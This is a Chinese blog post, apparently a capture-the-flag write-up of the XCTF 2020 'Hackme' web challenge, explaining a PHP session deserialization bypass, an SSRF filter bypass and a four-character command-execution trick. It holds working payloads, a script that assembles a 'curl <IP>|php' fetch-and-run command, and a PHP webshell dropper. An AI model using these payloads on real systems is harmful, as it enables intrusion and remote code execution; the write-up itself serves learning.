@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="白仁的博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="XCTF-Hackme因为疫情在家没事做在写Django的博客。然后刚好Xctf首战新春战疫开始，就看了一下。这道题参考了很多题目比较综合，特此记录。环境已经关闭所以没有源码，核心的绕法和payload的意义会详细解释。最核心考点少于四字的命令执行具体情景和 hitcon 2017类似。 思路分析 下载源码审计，看到了可以构造反序列化控制admin的值为1。执行成功反序列化后进入核心题目，核心思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XCTF-Hackme">
+<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;index.html">
+<meta property="og:site_name" content="白仁的博客">
+<meta property="og:description" content="XCTF-Hackme因为疫情在家没事做在写Django的博客。然后刚好Xctf首战新春战疫开始，就看了一下。这道题参考了很多题目比较综合，特此记录。环境已经关闭所以没有源码，核心的绕法和payload的意义会详细解释。最核心考点少于四字的命令执行具体情景和 hitcon 2017类似。 思路分析 下载源码审计，看到了可以构造反序列化控制admin的值为1。执行成功反序列化后进入核心题目，核心思路">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;8.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;9.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;10.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;11.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;6.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;5.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;7.png">
+<meta property="og:updated_time" content="2020-03-17T14:34:31.925Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;03&#x2F;10&#x2F;XCTF%E4%B9%8BHackme&#x2F;8.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://bai-ren-1.github.io/2020/03/10/XCTF之Hackme/"/>
+
+
+
+
+
+  <title>XCTF-Hackme | 白仁的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">白仁的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2020/03/10/XCTF%E4%B9%8BHackme/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="白仁">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="白仁的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XCTF-Hackme</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-10T16:07:43+08:00">
+                2020-03-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XCTF-Hackme"><a href="#XCTF-Hackme" class="headerlink" title="XCTF-Hackme"></a>XCTF-Hackme</h1><p>因为疫情在家没事做在写Django的博客。然后刚好Xctf首战新春战疫开始，就看了一下。这道题参考了很多题目比较综合，特此记录。环境已经关闭所以没有源码，核心的绕法和payload的意义会详细解释。最核心考点少于四字的命令执行具体情景和 hitcon 2017类似。</p>
+<p>思路分析</p>
+<p>下载源码审计，看到了可以构造反序列化控制admin的值为1。执行成功反序列化后进入核心题目，核心思路是绕过ssrf后进行一个命令字数小于4的命令执行。</p>
+<h2 id="参考题目"><a href="#参考题目" class="headerlink" title="参考题目"></a>参考题目</h2><p>hitcon 2017 revenge <a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">https://findneo.github.io/171110Bypass4CLimit/</a></p>
+<p>Byte 2019 CTF  <a href="https://blog.csdn.net/a3320315/article/details/102989485/" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102989485/</a> </p>
+<h2 id="Part1-Session反序列化"><a href="#Part1-Session反序列化" class="headerlink" title="Part1 - Session反序列化"></a>Part1 - Session反序列化</h2><blockquote>
+<p> Session反序列化漏洞：在<strong>设置 session 和读取 session 两个阶段</strong>中，若使用了不同的序列化方法，将产生任意对象注入，进而导致反序列化漏洞。 </p>
+<p>PHP 获取到 session 字符串后，就开始查找<strong>第一个 |</strong>（竖线），用竖线将字符串分割成“键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。（可利用点：<strong>键值天生就是如果是序列化字符的话，可以直接被反序列。可用来绕过某些构造方法的变量值限定</strong>）</p>
+</blockquote>
+<h4 id="1-PHP-Session-序列化及反序列化处理器"><a href="#1-PHP-Session-序列化及反序列化处理器" class="headerlink" title="1) PHP Session 序列化及反序列化处理器"></a>1) PHP Session 序列化及反序列化处理器</h4><p>PHP 内置了多种处理器用于<strong>存取 $_SESSION 数据</strong>时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p>
+<table>
+<thead>
+<tr>
+<th>处理器</th>
+<th>对应的存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php</td>
+<td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
+</tr>
+<tr>
+<td>php_serialize (php&gt;=5.5.4)</td>
+<td>经过 serialize() 函数反序列处理的数组</td>
+</tr>
+</tbody></table>
+<h4 id="2-配置选项-session-serialize-handler"><a href="#2-配置选项-session-serialize-handler" class="headerlink" title="2) 配置选项 session.serialize_handler"></a>2) 配置选项 session.serialize_handler</h4><p>PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler	<span class="string">"php"</span>	PHP_INI_ALL</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-安全隐患"><a href="#3-安全隐患" class="headerlink" title="3) 安全隐患"></a>3) 安全隐患</h4><p>通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据：）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'ryat'</span>] = <span class="string">'|O:8:"stdClass":0:&#123;&#125;'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>例如上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"ryat"</span>;s:<span class="number">20</span>:<span class="string">"|O:8:"</span>stdClass<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<strong>读取数据时</strong>如果用的反序列化处理器不是 php_serialize，而<strong>是 php</strong> 的话，那么反序列化后的数据将会变成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var_dump($_SESSION);</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:4:"</span>ryat<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，通过注入 <code>|</code> 字符伪造了对象的序列化数据，成功实例化了 stdClass 对象：）</p>
+<blockquote>
+<p>即是PHP 获取到 session 字符串后，就开始查找第一个 |（竖线），用竖线将字符串分割成“键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。 </p>
+</blockquote>
+<h3 id="4-回归题目分析"><a href="#4-回归题目分析" class="headerlink" title="4)回归题目分析"></a>4)回归题目分析</h3><p>我们访问upload文件可以看到，它包含的是他目录下面的<code>init.php</code>。其中存入<code>session</code>使用的是<code>php_serialize</code>模式</p>
+<p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/8.png" alt></p>
+<p>然后我们看我们的目标<code>/core/index.php</code>，里面也包含了一个<code>init.php</code>进行session配置，不过这个<code>init.php</code>跟上面的不一样</p>
+<p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/9.png" alt></p>
+<p>这就导致<code>/core/index.php</code>访问session时和刚刚存储使用的session不同，导致解析漏洞。<strong>会自动将|后面的进行反序列化</strong>，这就实例化了info类，绕过他的构造函数对admin的控制了，成功让admin为1。</p>
+<p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/10.png" alt></p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"sign"</span>: <span class="string">'|O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:5:"shabi";&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<p>获取到源码并进入Part2，进入ssrf的绕过：</p>
+<p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/11.png" alt></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//data:@127.0.0.1/baidu.com?,payload</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//data:@127.0.0.1/plain;base64,payload</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Part2-SSRF绕法"><a href="#Part2-SSRF绕法" class="headerlink" title="Part2 - SSRF绕法"></a>Part2 - SSRF绕法</h2><h3 id="1-参考连接"><a href="#1-参考连接" class="headerlink" title="1) 参考连接"></a>1) 参考连接</h3><p>【SSRF】如何绕过filter_var, preg_match和 parse_url <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a> </p>
+<h3 id="2-回归题目分析"><a href="#2-回归题目分析" class="headerlink" title="2)回归题目分析"></a>2)回归题目分析</h3><ul>
+<li>FILTER_VALIDATE_URL 过滤器把值作为URL来验证 。</li>
+<li>compress.zlib://data: 绕过 preg_match 对直接使用data协议data://的绕过 。</li>
+<li>@：绕过 preg_match 对域名为127.0.0.1的绕过。</li>
+<li>file_get_content：绕过本地文件读取直接接受payload的值。</li>
+</ul>
+<blockquote>
+<p>关于绕过filter_var和parse_url，在file_get_contents的情况下，可以用data://伪协议来绕过，对于这样的形式data://text/plain;base64,xxxxx，parse_url会将text作为host，并且PHP对MIME不敏感，改为这样data://baidu.com/plain;base64,xxxxx就能绕过，并且file_get_contents能直接读取到xxxx的内容。由于题目已经禁止了以data开头，所以我们可以用compress.zlib</p>
+</blockquote>
+<h2 id="Linux特性"><a href="#Linux特性" class="headerlink" title="Linux特性"></a>Linux特性</h2><p>EXP里面使用的了一些Linux特性，这里简单的复现一下。</p>
+<h3 id="1-命令可以通过-符号断续执行"><a href="#1-命令可以通过-符号断续执行" class="headerlink" title="1) 命令可以通过 \ 符号断续执行"></a>1) 命令可以通过 \ 符号断续执行</h3><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/1.png" alt></p>
+<p>通过\对命令进行截断，我们最后可以断续的构造出<code>echo 111</code>这个命令。</p>
+<h3 id="2-通过重定向-gt-符号新建文件"><a href="#2-通过重定向-gt-符号新建文件" class="headerlink" title="2) 通过重定向 &gt; 符号新建文件"></a>2) 通过重定向 &gt; 符号新建文件</h3><p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/2.png" alt></p>
+<p>重定向就不说了，简单标注 &gt; 和 &gt;&gt; 的区别：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; 是追加；</span><br><span class="line">&gt; 是覆盖；</span><br></pre></td></tr></table></figure>
+
+<p>上例中我通过 &gt; 新建了一个空文件 <code>shabi</code>。</p>
+<h3 id="3-通过命令-sh-执行文件内容"><a href="#3-通过命令-sh-执行文件内容" class="headerlink" title="3) 通过命令 sh 执行文件内容"></a>3) 通过命令 sh 执行文件内容</h3><p>当文件里面的内容是系统命令时，我们能通过 <code>sh 文件名</code>的形式来调用里面命令</p>
+<p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/3.png" alt></p>
+<p>上例我新建shabi文件并写入 <code>echo &#39;you are shabi&#39;</code>，然后我通过<code>sh shabi</code>可见成功执行了其中的命令并打印出内容。</p>
+<h2 id="Part3-命令执行绕法"><a href="#Part3-命令执行绕法" class="headerlink" title="Part3 - 命令执行绕法"></a>Part3 - 命令执行绕法</h2><p>核心payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">pos0 = random.choice(<span class="string">'efgh'</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">'hkpq'</span>)</span><br><span class="line">pos2 = <span class="string">'g'</span>  <span class="comment"># 随意选择字符</span></span><br><span class="line">payload = [</span><br><span class="line"><span class="string">'&gt;dir'</span>,</span><br><span class="line"><span class="comment"># 创建名为 dir 的文件</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;%s\&gt;'</span> % pos0,</span><br><span class="line"><span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;%st-'</span> % pos1,</span><br><span class="line"><span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></span><br><span class="line"><span class="comment"># 因为alphabetical序中t&gt;s</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"><span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></span><br><span class="line"><span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></span><br><span class="line"></span><br><span class="line"><span class="string">'*&gt;v'</span>,</span><br><span class="line"><span class="comment"># * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></span><br><span class="line"><span class="comment">#  dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></span><br><span class="line"><span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;rev'</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></span><br><span class="line"><span class="string">'*v&gt;%s'</span> % pos2,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。</span></span><br><span class="line"><span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></span><br><span class="line"><span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></span><br><span class="line"></span><br><span class="line"><span class="string">'&gt;p'</span>,</span><br><span class="line"><span class="string">'&gt;ph\\'</span>,</span><br><span class="line"><span class="string">'&gt;\|\\'</span>,</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line"><span class="string">'&gt;%s\\'</span> % ip[<span class="number">0</span>:<span class="number">2</span>],</span><br><span class="line"><span class="string">'&gt;\ \\'</span>,</span><br><span class="line"><span class="string">'&gt;rl\\'</span>,</span><br><span class="line"><span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'sh '</span> + pos2,</span><br><span class="line"><span class="comment"># sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></span><br><span class="line"><span class="comment"># 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></span><br><span class="line"><span class="string">'sh '</span> + pos0,</span><br><span class="line"><span class="comment"># sh f 执行curl命令，下载文件，写入木马。</span></span><br></pre></td></tr></table></figure>
+
+<p>1.当payload执行到<strong>第五行</strong>命令时，可以看出：</p>
+<p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/4.png" alt></p>
+<ul>
+<li>创建了五个文件dir、f&gt;、kt-、sl、v，目前仅v是内容非空的，其他为空。</li>
+<li>v中的内容如上<code>f&gt;  kt- sl</code>。</li>
+<li><code>*&gt;v</code>中<strong>*起通配符作用</strong>相当于<code>dir&gt;v</code>，即v的内容<code>f&gt; kt- sl</code>。</li>
+</ul>
+<p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/6.png" alt></p>
+<p>2.当继续执行<strong>第六行</strong>命令直到发生魔法那行命令：</p>
+<p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/5.png" alt></p>
+<ul>
+<li>新创建了rev空文件，用来起通配作用。</li>
+<li>使用<code>*v&gt;g</code>，这里注意<strong>*起通配符作用</strong>相当于 <code>rev v&gt;g</code>，即把<code>v</code>中内容反序写入g，即g的内容<code>ls -tk &gt;f</code>，目的是为了把命令拆分成文件名，并因为ls的-t选项按<strong>时间排序</strong>，来达成写入文件命令的作用。</li>
+</ul>
+<p>3.当从下面新的截断命令开始到继续执行完命令：</p>
+<p><img src="/2020/03/10/XCTF%E4%B9%8BHackme/7.png" alt></p>
+<p>可以看到ls -t的作用就能把这些<strong>通过时间来逆序</strong>把文件名拼接成有顺序的命令。</p>
+<ul>
+<li><code>sh pos2</code>即<code>sh g</code>，通过执行f的内容ls -tk并写入到文件f中</li>
+<li><code>sh pos0</code>即<code>sh f</code>，即执行f的内容（ls -tk的结果，即curl那条命令）去访问服务器的php文件并下载</li>
+</ul>
+<p>4.我们在服务器部署好马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php file_put_contents(\"hh.php\", \"&lt;?php eval(\\\$_GET[c]);?&gt;\");?&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面执行命令后就会请求并下载这个马，我们在访问沙盒下生成的hh.php就能获得flag了</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>附上这次比赛的wp：<a href="https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/。" target="_blank" rel="noopener">https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/。</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/" rel="next" title="面试腾讯">
+                <i class="fa fa-chevron-left"></i> 面试腾讯
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="prev" title="Tomcat文件包含">
+                Tomcat文件包含 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">白仁</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
